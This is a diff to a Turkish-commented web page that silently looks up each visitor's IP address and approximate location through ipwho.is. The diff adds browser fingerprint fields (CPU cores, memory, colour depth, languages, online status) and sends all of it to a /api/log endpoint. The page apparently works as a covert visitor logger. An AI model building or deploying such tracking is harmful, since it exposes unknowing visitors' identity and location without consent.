@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>‎</title>
+  <title>Ek Cihaz Bilgileri</title>
   <style>
     body {
       display: flex;
@@ -25,14 +25,12 @@
     // ipwho.is üzerinden IP tabanlı konum bilgisi almak
     async function getIPLocation() {
       try {
-        // ipwho.is -> JSON yanıt döndürür
         const res = await fetch('https://ipwho.is/');
         const data = await res.json();
         if (data.success) {
-          return data;
+          return data; // Başarılı yanıt
         } else {
-          // success = false
-          return null;
+          return null; // success = false
         }
       } catch (error) {
         console.error("IP tabanlı konum alınırken hata oluştu:", error);
@@ -42,6 +40,7 @@
 
     // Sunucuya veri gönderen fonksiyon
     async function sendData() {
+      // ipwho.is'den IP ve konum bilgisi
       const ipData = await getIPLocation();
 
       // Varsayılan değerler
@@ -50,7 +49,6 @@
       let lat = null;
       let lon = null;
 
-      // ipwho.is dönebildiyse
       if (ipData) {
         finalIP = ipData.ip || finalIP;
         const city = ipData.city || "Bilinmeyen";
@@ -60,6 +58,7 @@
         lon = ipData.longitude || null;
       }
 
+      // Mevcut veriler
       let userData = {
         ip: finalIP,
         userAgent: navigator.userAgent,
@@ -71,6 +70,23 @@
         latitude: lat,
         longitude: lon
       };
+
+      // 1) Mantıksal CPU çekirdek sayısı
+      userData.hardwareConcurrency = navigator.hardwareConcurrency || "Bilinmiyor";
+
+      // 2) Yaklaşık cihaz belleği (GB)
+      // (Her tarayıcıda desteklenmeyebilir; destek yoksa undefined döner)
+      userData.deviceMemory = navigator.deviceMemory || "Bilinmiyor";
+
+      // 3) Renk derinliği (screen.colorDepth)
+      userData.colorDepth = screen.colorDepth || "Bilinmiyor";
+
+      // 4) Tarayıcının desteklediği diller (navigator.languages)
+      // Örnek: ["tr-TR","en-US"]
+      userData.languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
+
+      // 5) Çevrim içi mi? (navigator.onLine)
+      userData.isOnline = navigator.onLine;
 
       // Sunucuya (ör. /api/log) POST isteği
       fetch('/api/log', {
